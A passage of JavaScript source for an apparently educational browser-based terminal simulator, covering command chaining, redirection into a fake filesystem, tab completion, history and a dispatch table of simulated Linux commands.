                chains[chains.length - 1] = { ...chains[chains.length - 1], nextOp: '&&' };
                current = '';
                i += 2;
                continue;
            }
            if (char === '|' && next === '|') {
                if (current.trim()) chains.push({ cmd: current, operator: chains.length ? chains[chains.length-1].nextOp : null });
                chains[chains.length - 1] = { ...chains[chains.length - 1], nextOp: '||' };
                current = '';
                i += 2;
                continue;
            }
            if (char === '|' && next !== '|') {
                if (current.trim()) chains.push({ cmd: current, operator: chains.length ? chains[chains.length-1].nextOp : null });
                chains[chains.length - 1] = { ...chains[chains.length - 1], nextOp: '|' };
                current = '';
                i++;
                continue;
            }
            if (char === ';') {
                if (current.trim()) chains.push({ cmd: current, operator: chains.length ? chains[chains.length-1].nextOp : null });
                chains[chains.length - 1] = { ...chains[chains.length - 1], nextOp: ';' };
                current = '';
                i++;
                continue;
            }

            current += char;
            i++;
        }

        if (current.trim()) {
            chains.push({ cmd: current, operator: chains.length ? chains[chains.length-1].nextOp : null });
        }

        // Flatten to simpler format
        return chains.map((c, idx) => ({
            cmd: c.cmd,
            operator: idx === 0 ? null : chains[idx - 1].nextOp
        }));
    }

    _executeSingleCommand(cmdLine, pipeInput, fromChain = false) {
        // Store original for history
        const originalCmdLine = cmdLine;

        // If not called from chaining, handle print and history here
        if (!fromChain) {
            this.commandHistory.push(originalCmdLine);
            this.historyIndex = this.commandHistory.length;
            this._printCommand(originalCmdLine);
        }
        // When fromChain=true, _executeWithChaining already handled print and history

        // Check for background execution (&)
        const isBackground = cmdLine.trim().endsWith('&');
        if (isBackground) {
            cmdLine = cmdLine.trim().slice(0, -1).trim();
            const job = {
                id: this._nextJobId++,
                pid: this._nextPid++,
                command: cmdLine,
                status: 'running'
            };
            this._jobs.push(job);
            this._printOutput(`[${job.id}] ${job.pid}`);
            return { output: '', exitCode: 0 };
        }

        // Expand variables and tildes
        cmdLine = this._expandVariables(cmdLine);

        // Handle output redirection (>> or >)
        // First, strip stderr redirects (2>/dev/null, 2>&1) - we just ignore stderr
        cmdLine = cmdLine.replace(/\s*2>(?:&1|\/dev\/null|\S+)/g, '');

        let redirectFile = null;
        let appendMode = false;
        if (cmdLine.includes('>>')) {
            appendMode = true;
            const parts = cmdLine.split('>>');
            cmdLine = parts[0].trim();
            redirectFile = parts[1]?.trim();
        } else if (cmdLine.includes('>')) {
            const parts = cmdLine.split('>');
            cmdLine = parts[0].trim();
            redirectFile = parts[1]?.trim();
        }

        // Parse command
        const { cmd, args } = this._parseCommand(cmdLine);

        let output = '';
        let exitCode = 0;

        // Execute command (pass pipeInput for commands that can use it)
        const result = this._runCommand(cmd, args, pipeInput);
        output = result.output || '';
        exitCode = result.exitCode || 0;

        // Handle redirect - write to file instead of printing
        if (redirectFile) {
            const textOutput = output.replace(/<[^>]*>/g, ''); // Strip HTML tags
            const path = this._resolvePath(redirectFile);

            if (this.fs[path]) {
                // File exists - append or overwrite
                this.fs[path].content = appendMode
                    ? (this.fs[path].content || '') + textOutput + '\n'
                    : textOutput;
            } else {
                // Create new file
                const parentPath = path.substring(0, path.lastIndexOf('/')) || '/';
                const fileName = path.split('/').pop();

                // Add to parent's children if parent exists
                if (this.fs[parentPath] && this.fs[parentPath].children) {
                    if (!this.fs[parentPath].children.includes(fileName)) {
                        this.fs[parentPath].children.push(fileName);
                    }
                }

                // Create the file
                this.fs[path] = {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: this.user,
                    group: this.user,
                    size: textOutput.length,
                    content: textOutput
                };
            }

            this._printOutput(`[Output redirected to ${redirectFile}]`);
            // Check objectives with the redirect info
            this._checkObjectives(originalCmdLine, `Redirected to ${redirectFile}`);
            return { output: `Redirected to ${redirectFile}`, exitCode: 0 };
        }

        // When fromChain=true, _executeWithChaining handles output/objectives/hints
        if (!fromChain) {
            if (output) {
                this._printOutput(output);
            }

            // Check objectives
            this._checkObjectives(cmdLine, output);

            // Track achievements
            this._trackAchievements(cmdLine);

            // Show smart hints (educational feedback)
            const hint = this._getSmartHint(cmdLine, output);
            if (hint) {
                this._showSmartHint(hint);
            }

            // Callback
            this._onCommand(cmdLine, output);
        }

        return { output, exitCode };
    }

    _expandVariables(cmdLine) {
        // Expand environment variables $VAR and ${VAR}
        cmdLine = cmdLine.replace(/\$\{(\w+)\}/g, (m, v) => this.env[v] || '');
        cmdLine = cmdLine.replace(/\$(\w+)/g, (m, v) => this.env[v] || '');

        // Expand ~ to home directory (but not ~username for now)
        cmdLine = cmdLine.replace(/^~(?=\/|$)/g, `/home/${this.user}`);
        cmdLine = cmdLine.replace(/(\s)~(?=\/|$)/g, `$1/home/${this.user}`);

        return cmdLine;
    }

    // ═══════════════════════════════════════════════════════════════
    // WILDCARD/GLOB EXPANSION
    // ═══════════════════════════════════════════════════════════════

    _expandWildcards(args) {
        const expanded = [];
        for (const arg of args) {
            if (arg.includes('*') || arg.includes('?') || arg.includes('{')) {
                const matches = this._globMatch(arg);
                if (matches.length > 0) {
                    expanded.push(...matches);
                } else {
                    expanded.push(arg); // No match, keep original
                }
            } else {
                expanded.push(arg);
            }
        }
        return expanded;
    }

    _globMatch(pattern) {
        // Handle brace expansion first: {a,b,c}
        if (pattern.includes('{')) {
            const braceMatch = pattern.match(/\{([^}]+)\}/);
            if (braceMatch) {
                const options = braceMatch[1].split(',');
                const results = [];
                for (const opt of options) {
                    const expanded = pattern.replace(braceMatch[0], opt);
                    results.push(...this._globMatch(expanded));
                }
                return results;
            }
        }

        // Determine search directory and pattern
        const lastSlash = pattern.lastIndexOf('/');
        let searchDir, filePattern;

        if (lastSlash >= 0) {
            searchDir = this._resolvePath(pattern.substring(0, lastSlash) || '/');
            filePattern = pattern.substring(lastSlash + 1);
        } else {
            searchDir = this.currentDir;
            filePattern = pattern;
        }

        const dirEntry = this.fs[searchDir];
        if (!dirEntry || dirEntry.type !== 'dir') return [];

        // Convert glob pattern to regex
        const regexPattern = filePattern
            .replace(/\./g, '\\.')
            .replace(/\*/g, '.*')
            .replace(/\?/g, '.');
        const regex = new RegExp(`^${regexPattern}$`);

        const matches = (dirEntry.children || [])
            .filter(name => regex.test(name))
            .map(name => {
                if (lastSlash >= 0) {
                    return pattern.substring(0, lastSlash + 1) + name;
                }
                return name;
            })
            .sort();

        return matches;
    }

    // ═══════════════════════════════════════════════════════════════
    // I/O REDIRECTION
    // ═══════════════════════════════════════════════════════════════

    _parseRedirection(args) {
        let stdout = null;
        let stdin = null;
        let append = false;
        let stderr = null;
        const cleanArgs = [];

        for (let i = 0; i < args.length; i++) {
            const arg = args[i];

            if (arg === '>') {
                stdout = args[++i];
                append = false;
            } else if (arg === '>>') {
                stdout = args[++i];
                append = true;
            } else if (arg === '<') {
                stdin = args[++i];
            } else if (arg === '2>&1') {
                stderr = 'stdout';
            } else if (arg === '2>') {
                stderr = args[++i];
            } else if (arg.startsWith('>')) {
                stdout = arg.substring(1);
                append = false;
            } else if (arg.startsWith('>>')) {
                stdout = arg.substring(2);
                append = true;
            } else {
                cleanArgs.push(arg);
            }
        }

        return { args: cleanArgs, stdout, stdin, append, stderr };
    }

    _handleRedirection(output, redirection) {
        const { stdout, append, stdin } = redirection;

        // Handle stdin redirection (read from file)
        let inputContent = null;
        if (stdin) {
            const resolved = this._resolvePath(stdin);
            const entry = this.fs[resolved];
            if (entry && entry.type === 'file') {
                inputContent = entry.content;
            }
        }

        // Handle stdout redirection (write to file)
        if (stdout && output) {
            const resolved = this._resolvePath(stdout);
            const parent = resolved.substring(0, resolved.lastIndexOf('/')) || '/';
            const filename = resolved.split('/').pop();

            if (this.fs[parent] && this.fs[parent].type === 'dir') {
                if (append && this.fs[resolved]) {
                    this.fs[resolved].content += '\n' + output;
                } else {
                    this.fs[resolved] = {
                        type: 'file',
                        perms: '-rw-r--r--',
                        owner: this.user,
                        group: this.user,
                        content: output
                    };
                    if (!this.fs[parent].children.includes(filename)) {
                        this.fs[parent].children.push(filename);
                    }
                }
                return ''; // Don't print to terminal
            }
        }

        return output;
    }

    _parseCommand(cmdLine) {
        // Smart parsing that handles quotes
        const args = [];
        let current = '';
        let inQuote = null;

        for (let i = 0; i < cmdLine.length; i++) {
            const char = cmdLine[i];

            if ((char === '"' || char === "'") && !inQuote) {
                inQuote = char;
                continue;
            }
            if (char === inQuote) {
                inQuote = null;
                continue;
            }
            if (char === ' ' && !inQuote) {
                if (current) {
                    args.push(current);
                    current = '';
                }
                continue;
            }
            current += char;
        }
        if (current) args.push(current);

        return { cmd: args[0] || '', args: args.slice(1) };
    }

    // ═══════════════════════════════════════════════════════════════
    // TAB COMPLETION (Realistic Bash-style)
    // ═══════════════════════════════════════════════════════════════

    _handleTabCompletion() {
        const input = this.inputEl.value;
        const cursorPos = this.inputEl.selectionStart;
        const now = Date.now();

        // Get the word being completed
        const { word, wordStart, isCommand, cmdContext } = this._getCompletionContext(input, cursorPos);

        // Get completions
        let completions = [];
        if (isCommand) {
            completions = this._getCommandCompletions(word);
        } else {
            completions = this._getPathCompletions(word, cmdContext);
        }

        if (completions.length === 0) {
            // No completions - beep (visual feedback)
            this.inputEl.style.backgroundColor = '#300';
            setTimeout(() => this.inputEl.style.backgroundColor = '', 100);
            return;
        }

        // Double-tab detection: show all completions
        const isDoubleTab = (now - this._lastTabTime < 500) && (this._lastTabWord === word);
        this._lastTabTime = now;
        this._lastTabWord = word;

        if (completions.length === 1) {
            // Single match - complete it fully
            this._applyCompletion(input, cursorPos, wordStart, word, completions[0], isCommand);
        } else {
            // Multiple matches
            const commonPrefix = this._findCommonPrefix(completions);

            if (commonPrefix.length > word.length) {
                // Complete to common prefix
                this._applyCompletion(input, cursorPos, wordStart, word, commonPrefix, isCommand, true);
            } else if (isDoubleTab) {
                // Double-tab: show all completions formatted nicely
                this._showCompletions(completions, isCommand);
            }
            // Single tab with no common prefix: do nothing (wait for double-tab)
        }
    }

    _getCompletionContext(input, cursorPos) {
        const beforeCursor = input.substring(0, cursorPos);

        // Find the start of the current word (respecting quotes)
        let wordStart = cursorPos;
        let inQuote = null;

        for (let i = cursorPos - 1; i >= 0; i--) {
            const char = beforeCursor[i];
            if (char === '"' || char === "'") {
                if (inQuote === char) inQuote = null;
                else if (!inQuote) inQuote = char;
            }
            if (char === ' ' && !inQuote) {
                wordStart = i + 1;
                break;
            }
            if (i === 0) wordStart = 0;
        }

        const word = beforeCursor.substring(wordStart);

        // Determine if we're completing a command or an argument
        const textBeforeWord = beforeCursor.substring(0, wordStart).trim();
        const isCommand = textBeforeWord === '' ||
                         textBeforeWord.endsWith('|') ||
                         textBeforeWord.endsWith('&&') ||
                         textBeforeWord.endsWith('||') ||
                         textBeforeWord.endsWith(';') ||
                         textBeforeWord === 'sudo' ||
                         textBeforeWord.endsWith(' sudo');

        // Get the command context for smarter completions
        const parts = textBeforeWord.split(/\s+/);
        const cmdContext = parts[0] || '';

        return { word, wordStart, isCommand, cmdContext };
    }

    _getCommandCompletions(prefix) {
        const commands = [
            'alias', 'apt', 'apt-cache', 'apt-get', 'arp', 'at', 'atq', 'atrm', 'awk',
            'base64', 'basename', 'bash', 'bg',
            'cat', 'cd', 'chage', 'chgrp', 'chmod', 'chown', 'clear', 'cmatrix', 'cowsay', 'cp', 'crontab', 'curl', 'cut',
            'date', 'df', 'diff', 'dig', 'dirname', 'dmesg', 'dpkg', 'du',
            'echo', 'env', 'exit', 'export',
            'fdisk', 'fg', 'figlet', 'file', 'find', 'fortune', 'free',
            'getcap', 'getent', 'getfacl', 'grep', 'groupadd', 'groups', 'gunzip', 'gzip',
            'head', 'help', 'history', 'hollywood', 'hostname', 'htop',
            'id', 'ifconfig', 'iostat', 'ip',
            'jobs', 'journalctl',
            'kill', 'killall',
            'last', 'less', 'ln', 'locate', 'lolcat', 'ls', 'lsblk', 'lsof',
            'man', 'md5sum', 'mkdir', 'more', 'mount', 'mv',
            'nano', 'nc', 'netcat', 'netstat', 'nmap', 'nslookup',
            'passwd', 'ping', 'pkill', 'ps', 'pwd',
            'reboot', 'rm', 'rmdir', 'route',
            'sar', 'scp', 'sed', 'service', 'sha1sum', 'sha256sum', 'shutdown', 'sl', 'sort', 'source', 'ss', 'ssh', 'ssh-keygen', 'stat', 'strings', 'su', 'sudo', 'systemctl',
            'tail', 'tar', 'tcpdump', 'tee', 'time', 'top', 'touch', 'tr', 'traceroute', 'tree', 'type',
            'ulimit', 'umask', 'uname', 'uniq', 'unzip', 'uptime', 'useradd', 'userdel', 'usermod',
            'vi', 'vim', 'vmstat',
            'w', 'watch', 'wc', 'wget', 'whereis', 'which', 'whois', 'who', 'whoami',
            'xargs',
            'yes',
            'zip'
        ];

        if (!prefix) return commands;
        return commands.filter(cmd => cmd.startsWith(prefix));
    }

    _getPathCompletions(partial, cmdContext) {
        // Handle empty input - complete from current directory
        if (!partial) {
            const entry = this.fs[this.currentDir];
            if (entry && entry.type === 'dir' && entry.children) {
                return entry.children.sort();
            }
            return [];
        }

        // Handle ~ expansion
        let searchDir, filePrefix, returnPrefix;

        if (partial === '~') {
            return ['~/'];
        } else if (partial.startsWith('~/')) {
            const relativePath = partial.substring(2);
            const lastSlash = relativePath.lastIndexOf('/');
            if (lastSlash >= 0) {
                searchDir = `/home/${this.user}/${relativePath.substring(0, lastSlash)}`;
                filePrefix = relativePath.substring(lastSlash + 1);
                returnPrefix = '~/' + relativePath.substring(0, lastSlash + 1);
            } else {
                searchDir = `/home/${this.user}`;
                filePrefix = relativePath;
                returnPrefix = '~/';
            }
        } else if (partial.startsWith('/')) {
            // Absolute path
            const lastSlash = partial.lastIndexOf('/');
            searchDir = partial.substring(0, lastSlash) || '/';
            filePrefix = partial.substring(lastSlash + 1);
            returnPrefix = searchDir + (searchDir === '/' ? '' : '/');
        } else {
            // Relative path
            const lastSlash = partial.lastIndexOf('/');
            if (lastSlash >= 0) {
                searchDir = this._normalizePath(this.currentDir + '/' + partial.substring(0, lastSlash));
                filePrefix = partial.substring(lastSlash + 1);
                returnPrefix = partial.substring(0, lastSlash + 1);
            } else {
                searchDir = this.currentDir;
                filePrefix = partial;
                returnPrefix = '';
            }
        }

        // Normalize and find directory
        searchDir = this._normalizePath(searchDir);
        const dirEntry = this.fs[searchDir];

        if (!dirEntry || dirEntry.type !== 'dir') {
            return [];
        }

        const children = dirEntry.children || [];
        const matches = children.filter(name =>
            name.startsWith(filePrefix) || (filePrefix === '' && !name.startsWith('.'))
        );

        // Return with appropriate prefix
        return matches.map(name => returnPrefix + name).sort();
    }

    _applyCompletion(input, cursorPos, wordStart, oldWord, newWord, isCommand, isPartial = false) {
        const before = input.substring(0, wordStart);
        const after = input.substring(cursorPos);

        // Determine suffix
        let suffix = '';
        if (!isPartial) {
            if (isCommand) {
                suffix = ' ';
            } else {
                // Check if it's a directory
                const resolved = this._resolvePath(newWord);
                const entry = this.fs[resolved];
                if (entry && entry.type === 'dir') {
                    suffix = newWord.endsWith('/') ? '' : '/';
                } else if (entry) {
                    suffix = ' ';
                }
            }
        }

        this.inputEl.value = before + newWord + suffix + after;
        const newPos = before.length + newWord.length + suffix.length;
        this.inputEl.selectionStart = this.inputEl.selectionEnd = newPos;

        // Track tab completion for achievements
        this._trackTabCompletion();
    }

    _showCompletions(completions, isCommand) {
        // Format completions in columns like bash
        const maxLen = Math.max(...completions.map(c => c.length)) + 2;
        const cols = Math.max(1, Math.floor(80 / maxLen));

        let output = '\n';
        for (let i = 0; i < completions.length; i++) {
            let item = completions[i];

            // Add visual indicator for directories
            if (!isCommand) {
                const resolved = this._resolvePath(item);
                const entry = this.fs[resolved];
                if (entry && entry.type === 'dir' && !item.endsWith('/')) {
                    item += '/';
                }
            }

            output += item.padEnd(maxLen);
            if ((i + 1) % cols === 0) output += '\n';
        }

        this._printOutput(output.trimEnd());
        this._printCommand(this.inputEl.value);
    }

    _findCommonPrefix(strings) {
        if (strings.length === 0) return '';
        if (strings.length === 1) return strings[0];

        let prefix = strings[0];
        for (let i = 1; i < strings.length; i++) {
            while (!strings[i].startsWith(prefix)) {
                prefix = prefix.substring(0, prefix.length - 1);
                if (prefix === '') return '';
            }
        }
        return prefix;
    }

    // ═══════════════════════════════════════════════════════════════
    // HISTORY NAVIGATION
    // ═══════════════════════════════════════════════════════════════

    _historyUp() {
        if (this.commandHistory.length === 0) return;

        if (this.historyIndex === this.commandHistory.length) {
            // Save current input
            this._savedInput = this.inputEl.value;
        }

        if (this.historyIndex > 0) {
            this.historyIndex--;
        } else if (this.historyIndex === -1) {
            this.historyIndex = this.commandHistory.length - 1;
        }

        this.inputEl.value = this.commandHistory[this.historyIndex];
        // Move cursor to end
        this.inputEl.selectionStart = this.inputEl.selectionEnd = this.inputEl.value.length;
    }

    _historyDown() {
        if (this.historyIndex < this.commandHistory.length - 1) {
            this.historyIndex++;
            this.inputEl.value = this.commandHistory[this.historyIndex];
        } else {
            this.historyIndex = this.commandHistory.length;
            this.inputEl.value = this._savedInput || '';
        }
        // Move cursor to end
        this.inputEl.selectionStart = this.inputEl.selectionEnd = this.inputEl.value.length;
    }

    // ═══════════════════════════════════════════════════════════════
    // COMMAND EXECUTION ENGINE
    // ═══════════════════════════════════════════════════════════════

    _runCommand(cmd, args, pipeInput = null) {
        let output = '';
        let exitCode = 0;

        switch(cmd) {
            case 'pwd': output = this._cmdPwd(); break;
            case 'ls': output = this._cmdLs(args); break;
            case 'cd': output = this._cmdCd(args); break;
            case 'cat': output = this._cmdCat(args); break;
            case 'whoami': output = this.user; break;
            case 'hostname': output = this.hostname; break;
            case 'id': output = `uid=1000(${this.user}) gid=1000(${this.user}) groups=1000(${this.user}),27(sudo)`; break;
            case 'echo': output = args.join(' '); break;
            case 'uname': output = this._cmdUname(args); break;
            case 'date': output = new Date().toString(); break;
            case 'clear': this.outputEl.innerHTML = ''; break;
            case 'help': output = this._cmdHelp(); break;
            case 'grep': output = this._cmdGrep(args, pipeInput); break;
            case 'find': output = this._cmdFind(args); break;
            case 'head': output = this._cmdHead(args, pipeInput); break;
            case 'tail': output = this._cmdTail(args, pipeInput); break;
            case 'wc': output = this._cmdWc(args, pipeInput); break;
            case 'ps': output = this._cmdPs(args); break;
            case 'jobs': output = this._cmdJobs(); break;
            case 'fg': output = this._cmdFg(args); break;
            case 'bg': output = this._cmdBg(args); break;
            case 'kill': output = this._cmdKill(args); break;
            case 'killall': output = this._cmdKillall(args); break;
            case 'nohup': output = this._cmdNohup(args); break;
            case 'pgrep': output = this._cmdPgrep(args); break;
            case 'env': output = Object.entries(this.env).map(([k,v]) => `${k}=${v}`).join('\n'); break;
            case 'export': output = this._cmdExport(args); break;
            case 'history': output = this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n'); break;
            case 'df': output = this._cmdDf(args); break;
            case 'du': output = this._cmdDu(args); break;
            case 'ip': output = this._cmdIp(args); break;
            case 'ifconfig': output = this._cmdIfconfig(); break;
            case 'netstat': case 'ss': output = this._cmdNetstat(args); break;
            case 'last': output = this._cmdLast(); break;
            case 'w': output = this._cmdW(); break;
            case 'uptime': output = ' 10:30:00 up 5 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09'; break;
            case 'free': output = this._cmdFree(args); break;
            case 'lscpu': output = this._cmdLscpu(); break;
            case 'nproc': output = '4'; break;
            case 'arch': output = 'x86_64'; break;
            case 'top': output = this._cmdTop(); break;
            case 'systemctl': output = this._cmdSystemctl(args); break;
            case 'service': output = this._cmdService(args); break;
            case 'crontab': output = this._cmdCrontab(args); break;
            case 'at': output = this._cmdAt(args); break;
            case 'atq': output = this._cmdAtq(); break;
            case 'atrm': output = this._cmdAtrm(args); break;
            case 'dpkg': output = this._cmdDpkg(args); break;
            case 'apt': case 'apt-get': case 'apt-cache': output = this._cmdApt(args); break;
            case 'sudo': output = this._cmdSudo(args); break;
            case 'su': output = 'su: Authentication required (simulated)'; break;
            case 'chmod': case 'chown': case 'chgrp': output = ''; break;
            case 'mkdir': output = this._cmdMkdir(args); break;
            case 'touch': output = this._cmdTouch(args); break;
            case 'rm': output = this._cmdRm(args); break;
            case 'cp': case 'mv': output = ''; break;
            case 'file': output = this._cmdFile(args); break;
            case 'stat': output = this._cmdStat(args); break;
            case 'tar': output = this._cmdTar(args); break;
            case 'gzip': output = this._cmdGzip(args); break;
            case 'gunzip': output = this._cmdGunzip(args); break;
            case 'zip': case 'unzip': output = this._cmdZip(args, cmd); break;
            case 'ssh-keygen': output = this._cmdSshKeygen(args); break;
            case 'ssh': output = this._cmdSsh(args); break;
            case 'scp': output = this._cmdScp(args); break;
            case 'curl': case 'wget': output = 'Network request simulated'; break;
            case 'ping': output = this._cmdPing(args); break;
            case 'nslookup': case 'dig': output = this._cmdNslookup(args); break;
            case 'traceroute': output = 'traceroute: simulated'; break;
            case 'arp': output = this._cmdArp(); break;
            case 'route': output = this._cmdRoute(); break;
            case 'lsblk': output = this._cmdLsblk(); break;
            case 'mount': output = this._cmdMount(); break;
            case 'fdisk': output = 'fdisk: requires root privileges'; break;
            case 'getfacl': output = this._cmdGetfacl(args); break;
            case 'getcap': output = this._cmdGetcap(args); break;
            case 'getent': output = this._cmdGetent(args); break;
            case 'chage': output = this._cmdChage(args); break;
            case 'passwd': output = this._cmdPasswd(args); break;
            case 'useradd': case 'userdel': case 'usermod': case 'groupadd':
                output = `${cmd}: requires root privileges (use sudo)`; break;
            case 'vim': case 'vi': case 'nano': output = this._cmdVim(args); break;
            case 'less': case 'more': output = this._cmdCat(args); break;
            case 'man': output = this._cmdMan(args); break;
            case 'which': output = args[0] ? `/usr/bin/${args[0]}` : 'which: missing argument'; break;
            case 'type': output = args[0] ? `${args[0]} is /usr/bin/${args[0]}` : 'type: missing argument'; break;
            case 'alias': output = 'alias ll=\'ls -la\''; break;
            case 'vmstat': output = this._cmdVmstat(); break;
            case 'iostat': output = this._cmdIostat(); break;
            case 'sar': output = this._cmdSar(); break;
            case 'exit': output = 'logout'; break;
            case 'true': exitCode = 0; break;
            case 'false': exitCode = 1; break;
            // Script execution
            case 'bash': case 'sh': output = this._cmdBash(args); break;
            case 'source': output = this._cmdBash(args); break;
            // Text processing commands
            case 'sort': output = this._cmdSort(args, pipeInput); break;
            case 'uniq': output = this._cmdUniq(args, pipeInput); break;
            case 'cut': output = this._cmdCut(args, pipeInput); break;
            case 'tr': output = this._cmdTr(args, pipeInput); break;
            case 'sed': output = this._cmdSed(args, pipeInput); break;
            case 'awk': output = this._cmdAwk(args, pipeInput); break;
            case 'tee': output = this._cmdTee(args, pipeInput); break;
            case 'xargs': output = this._cmdXargs(args); break;
            // Crypto/encoding commands
            case 'base64': output = this._cmdBase64(args); break;
            case 'md5sum': output = this._cmdMd5sum(args); break;
            case 'sha256sum': output = this._cmdSha256sum(args); break;
            case 'sha1sum': output = this._cmdSha1sum(args); break;
            case 'strings': output = this._cmdStrings(args); break;
            // Security/recon commands
            case 'nmap': output = this._cmdNmap(args); break;
            case 'nc': case 'netcat': output = this._cmdNetcat(args); break;
            case 'tcpdump': output = this._cmdTcpdump(args); break;
            case 'whois': output = this._cmdWhois(args); break;
            // Radio system (The Watcher)
            case 'tune': output = this._cmdTune(args); break;
            case 'scan': output = this._cmdScan(); break;
            case 'radio': output = this._cmdRadio(args); break;
            // Easter eggs
            case 'sl': output = this._cmdSl(); break;
            case 'cowsay': output = this._cmdCowsay(args); break;
            case 'fortune': output = this._cmdFortune(); break;
            case 'cmatrix': output = this._cmdCmatrix(); break;
            case 'figlet': output = this._cmdFiglet(args); break;
            case 'lolcat': output = this._cmdLolcat(args); break;
            case 'hollywood': output = this._cmdHollywood(); break;
            case '': break;
            default:
                // Check for direct script execution (./script.sh or /path/to/script)
                if (cmd.startsWith('./') || cmd.startsWith('/')) {
                    const resolved = this._resolvePath(cmd);
                    const entry = this.fs[resolved];

                    if (entry) {
                        if (entry.type === 'dir') {
                            output = `bash: ${cmd}: Is a directory`;
                        } else if (!entry.perms || !entry.perms.includes('x')) {
                            output = `bash: ${cmd}: Permission denied`;
                        } else {
                            output = this._cmdBash([cmd]);
                        }
                    } else {
                        output = `bash: ${cmd}: No such file or directory`;
                    }
                    exitCode = output.includes('Permission denied') || output.includes('No such file') ? 126 : 0;
                } else {
                    output = `${cmd}: command not found`;
                    exitCode = 127;
                }
        }

        return { output, exitCode };
    }

    // Legacy _execute method (for backwards compatibility)
    _execute(cmdLine) {
        // Add to history
        this.commandHistory.push(cmdLine);
        this.historyIndex = this.commandHistory.length;

        // Print command
        this._printCommand(cmdLine);

        // Parse and execute
        const parts = cmdLine.split(/\s+/);
        const cmd = parts[0];
        const args = parts.slice(1);

        let output = '';

        switch(cmd) {
            case 'pwd': output = this._cmdPwd(); break;
            case 'ls': output = this._cmdLs(args); break;
            case 'cd': output = this._cmdCd(args); break;
            case 'cat': output = this._cmdCat(args); break;
            case 'whoami': output = this.user; break;
            case 'hostname': output = this.hostname; break;
            case 'id': output = `uid=1000(${this.user}) gid=1000(${this.user}) groups=1000(${this.user}),27(sudo)`; break;
            case 'echo': output = args.join(' ').replace(/^\$(\w+)/, (m, v) => this.env[v] || ''); break;
            case 'uname': output = this._cmdUname(args); break;
            case 'date': output = new Date().toString(); break;
            case 'clear': this.outputEl.innerHTML = ''; return;
            case 'help': output = this._cmdHelp(); break;
            case 'grep': output = this._cmdGrep(args); break;
            case 'find': output = this._cmdFind(args); break;
            case 'head': output = this._cmdHead(args); break;
            case 'tail': output = this._cmdTail(args); break;
            case 'wc': output = this._cmdWc(args); break;
            case 'ps': output = this._cmdPs(args); break;
            case 'jobs': output = this._cmdJobs(); break;
            case 'fg': output = this._cmdFg(args); break;
            case 'bg': output = this._cmdBg(args); break;
            case 'kill': output = this._cmdKill(args); break;
            case 'killall': output = this._cmdKillall(args); break;
            case 'nohup': output = this._cmdNohup(args); break;
            case 'pgrep': output = this._cmdPgrep(args); break;
            case 'env': output = Object.entries(this.env).map(([k,v]) => `${k}=${v}`).join('\n'); break;
            case 'export': output = this._cmdExport(args); break;
            case 'history': output = this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n'); break;
            case 'df': output = this._cmdDf(args); break;
            case 'du': output = this._cmdDu(args); break;
            case 'ip': output = this._cmdIp(args); break;
            case 'ifconfig': output = this._cmdIfconfig(); break;
            case 'netstat': case 'ss': output = this._cmdNetstat(args); break;
            case 'last': output = this._cmdLast(); break;
            case 'w': output = this._cmdW(); break;
            case 'uptime': output = ' 10:30:00 up 5 days, 3:42, 1 user, load average: 0.08, 0.12, 0.09'; break;
            case 'free': output = this._cmdFree(args); break;
            case 'lscpu': output = this._cmdLscpu(); break;
            case 'nproc': output = '4'; break;
            case 'arch': output = 'x86_64'; break;
            case 'top': output = this._cmdTop(); break;
            case 'systemctl': output = this._cmdSystemctl(args); break;
            case 'service': output = this._cmdService(args); break;
            case 'crontab': output = this._cmdCrontab(args); break;
            case 'at': output = this._cmdAt(args); break;
            case 'atq': output = this._cmdAtq(); break;
            case 'atrm': output = this._cmdAtrm(args); break;
            case 'dpkg': output = this._cmdDpkg(args); break;
            case 'apt': case 'apt-get': case 'apt-cache': output = this._cmdApt(args); break;
            case 'sudo': output = this._cmdSudo(args); break;
            case 'su': output = 'su: Authentication required (simulated)'; break;
            case 'chmod': case 'chown': case 'chgrp': output = ''; break;
            case 'mkdir': output = this._cmdMkdir(args); break;
            case 'touch': output = this._cmdTouch(args); break;
            case 'rm': output = this._cmdRm(args); break;
            case 'cp': case 'mv': output = ''; break;
            case 'file': output = this._cmdFile(args); break;
            case 'stat': output = this._cmdStat(args); break;
            case 'tar': output = this._cmdTar(args); break;
            case 'gzip': output = this._cmdGzip(args); break;
            case 'gunzip': output = this._cmdGunzip(args); break;
            case 'zip': case 'unzip': output = this._cmdZip(args, cmd); break;
            case 'ssh-keygen': output = this._cmdSshKeygen(args); break;
            case 'ssh': output = this._cmdSsh(args); break;
            case 'scp': output = this._cmdScp(args); break;
            case 'curl': case 'wget': output = 'Network request simulated'; break;
            case 'ping': output = this._cmdPing(args); break;
            case 'nslookup': case 'dig': output = this._cmdNslookup(args); break;
            case 'traceroute': output = 'traceroute: simulated'; break;
            case 'arp': output = this._cmdArp(); break;
            case 'route': output = this._cmdRoute(); break;
            case 'lsblk': output = this._cmdLsblk(); break;
            case 'mount': output = this._cmdMount(); break;
            case 'fdisk': output = 'fdisk: requires root privileges'; break;
            case 'getfacl': output = this._cmdGetfacl(args); break;
            case 'getcap': output = this._cmdGetcap(args); break;
            case 'getent': output = this._cmdGetent(args); break;
            case 'chage': output = this._cmdChage(args); break;
            case 'passwd': output = this._cmdPasswd(args); break;
            case 'useradd': case 'userdel': case 'usermod': case 'groupadd':
                output = `${cmd}: requires root privileges (use sudo)`; break;
            case 'vim': case 'vi': case 'nano': output = this._cmdVim(args); break;
            case 'less': case 'more': output = this._cmdCat(args); break;
            case 'man': output = this._cmdMan(args); break;
            case 'which': output = args[0] ? `/usr/bin/${args[0]}` : 'which: missing argument'; break;
            case 'type': output = args[0] ? `${args[0]} is /usr/bin/${args[0]}` : 'type: missing argument'; break;
            case 'alias': output = 'alias ll=\'ls -la\''; break;
            case 'vmstat': output = this._cmdVmstat(); break;
            case 'iostat': output = this._cmdIostat(); break;
            case 'sar': output = this._cmdSar(); break;
            // Script execution
            case 'bash': case 'sh': output = this._cmdBash(args); break;
            case 'source': output = this._cmdBash(args); break;
            default:
                // Check for direct script execution (./script.sh or /path/to/script)
                if (cmd.startsWith('./') || cmd.startsWith('/')) {
                    const resolved = this._resolvePath(cmd);
                    const entry = this.fs[resolved];

                    if (entry) {
                        if (entry.type === 'dir') {
                            output = `bash: ${cmd}: Is a directory`;
                        } else if (!entry.perms || !entry.perms.includes('x')) {
                            output = `bash: ${cmd}: Permission denied`;
                        } else {
                            output = this._cmdBash([cmd]);
                        }
                    } else {
